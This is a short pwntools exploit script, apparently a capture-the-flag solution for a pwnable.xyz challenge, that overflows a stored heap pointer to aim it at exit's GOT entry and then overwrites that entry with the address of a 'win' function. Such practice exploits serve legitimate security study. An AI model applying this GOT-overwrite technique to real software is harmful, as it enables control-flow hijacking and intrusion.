from pwn import *

context.terminal = ['xterm', '-e']
r = process('./challenge')
# r = remote("svc.pwnable.xyz" , 30011)

r.sendlineafter("> ", "1")

r.sendlineafter(": ", "a")
r.sendlineafter(": ", "1")
r.sendlineafter("> ", "3")
r.sendlineafter(": ", "b")

exit_got = 0x004007c0
win = 0x00400b71
r.sendlineafter(": ", b"A" * 0x10 + p64(exit_got)) # overflow the value on the stack which represents the malloc pointer 
r.sendafter("> ", "3")
r.sendlineafter(": ", p64(win))
l = r.sendline(": ", "c")
l = r.interactive()

